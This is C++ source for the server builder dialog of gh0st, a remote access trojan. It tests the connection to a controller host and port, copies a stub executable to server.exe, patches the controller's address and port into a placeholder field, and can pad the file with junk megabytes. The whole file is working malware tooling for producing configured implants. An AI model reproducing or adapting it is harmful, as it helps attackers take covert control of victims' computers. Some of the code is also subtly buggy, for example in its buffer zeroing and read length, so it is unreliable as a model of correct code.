// BuildServer.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildServer.h"
#include "encode.h"
#include <shlwapi.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBuildServer dialog


CBuildServer::CBuildServer(CWnd* pParent /*=NULL*/)
	: CDialog(CBuildServer::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuildServer)
	m_remote_host = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "Host", "127.0.0.1");
	m_remote_port =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "Port", "2014");
	
	//}}AFX_DATA_INIT
}


void CBuildServer::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildServer)
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildServer, CDialog)
	//{{AFX_MSG_MAP(CBuildServer)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_EN_CHANGE(IDC_REMOTE_HOST, OnChangeRemoteHost)
	ON_EN_CHANGE(IDC_REMOTE_PORT, OnChangeRemotePort)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildServer message handlers

void CBuildServer::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		MessageBox("请完整填服务器信息","提示", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
}

BOOL CBuildServer::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (m_remote_host.GetLength() == 0)
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			m_remote_host = _T("127.0.0.1");	
	}
	UpdateData(false);
    OnChangeConfig();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CBuildServer::OnChangeConfig()
{
	UpdateData();

    m_remote_host.Replace(" ", "");//把找到的空格填充掉
	m_remote_port.Replace(" ", "");
	
	CString str = m_remote_host + ":" + m_remote_port;
	//::MessageBox(0,str,"ok", 0);
	UpdateData(FALSE);
}

void CBuildServer::OnChangeRemoteHost() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	OnChangeConfig();
}

void CBuildServer::OnChangeRemotePort() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	OnChangeConfig();
}

DWORD WINAPI CBuildServer::TestMaster( LPVOID lparam ) 
{
	// TODO: Add your control notification handler code here
	CBuildServer	*pThis = (CBuildServer *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		pThis->MessageBox("socket 初始化失败","提示", MB_ICONINFORMATION);
		return false;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_remote_host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(atoi(pThis->m_remote_port));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();
	
	if (bRet)
		strResult.Format("成功连接到主机“%s”的“%s”端口 ...", pThis->m_remote_host, pThis->m_remote_port);
	else
		strResult.Format("打开到主机“%s:%s”的连接失败 ...", pThis->m_remote_host, pThis->m_remote_port);
	
	pThis->MessageBox(strResult,"提示",MB_ICONINFORMATION);
	return -1;
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}
MODIFY_DATA modify_data = 
{
	"                                                          ",
		"",
		"",
};
CString SHANGXIANXINXI;
void CBuildServer::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	char Ip[256];
	GetDlgItemText(IDC_REMOTE_HOST,Ip,sizeof(Ip));
	char Port[256];
	GetDlgItemText(IDC_REMOTE_PORT,Port,sizeof(Port));
	//char Version[256];
	//GetDlgItemText(IDC_REMARK,Version,sizeof(Version));
	int int_chage = atoi((LPCSTR)m_remote_port);//CString 转换为int
	if (int_chage <=1 || int_chage >=65535)
	{
		::MessageBox(0,"端口范围只能为1~65535之间的一个数 ...","提示", MB_ICONINFORMATION);
		return;
	}
	char DatPath[256] = {0};		
    GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	PathRemoveFileSpec(DatPath);
    strcat( DatPath , "\\update\\server.Dat");
	
	CFileDialog dlg(FALSE, "exe", "server.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	
	DeleteFile(dlg.GetPathName());
	CopyFile(DatPath,dlg.GetPathName(),FALSE);
	CFile file;
    SHANGXIANXINXI=Ip;
	char ShangXian[256];
	wsprintf(ShangXian,"%s:%s",SHANGXIANXINXI,Port);
	strcpy(modify_data.Address,Ip);
	strcpy(modify_data.Port,Port);
	//	strcpy(modify_data.szMark,szMark);
	DWORD wr=0;
	HANDLE hFile=CreateFile(dlg.GetPathName(),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD len=GetFileSize(hFile,NULL);
	char *str=new char [len];
	ZeroMemory(str,sizeof(str));
	ReadFile(hFile,str,len+1,&wr,NULL);
	CloseHandle(hFile);
	DWORD dwOffset = memfind(str,"                                                          ",len, 0);
	if (dwOffset == -1)
	{
		AfxMessageBox("文件不合法");
		return;
	}
	if(file.Open (dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		try
		{
			file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
			file.Write((char*)&modify_data, sizeof(modify_data));
			file.Close();
		}
		catch(...)
		{
			MessageBox("文件保存失败，请检查","提示",MB_OK|MB_ICONSTOP);
			DeleteFile("Server.exe");
			return;
		}
	}
	/////////////////////////////////////////////////////////////////
	DWORD dwTmp;
	hFile = CreateFile(dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	SetFilePointer( hFile, 0, NULL, FILE_END );
	CString kb;
	int kb1;
	//	GetDlgItemText(IDC_EDIT_BEBIG,kb);
	kb1=atoi(kb);
	TCHAR ces[256];
	int i;
	i=0;
	char * BigCode=new char[1024*1024];
	while(i < kb1)
	{
		WriteFile(hFile,BigCode,1024*1024, &dwTmp, NULL);
		i++;
	}
	delete[] BigCode;
	CloseHandle(hFile);
	MessageBox("服务端文件生成成功,已保存为Server.exe","提示",MB_ICONWARNING);
	SendMessage(WM_CLOSE);
	//////////////////////////////////////////////////////////////////
	CString Text;
	GetWindowText(Text);
	HWND King = ::FindWindow(NULL,Text);
	::PostMessage(King,WM_CLOSE,1,0);
}

void CBuildServer::OnExit() 
{
	// TODO: Add your control notification handler code here
	OnCancel();
}
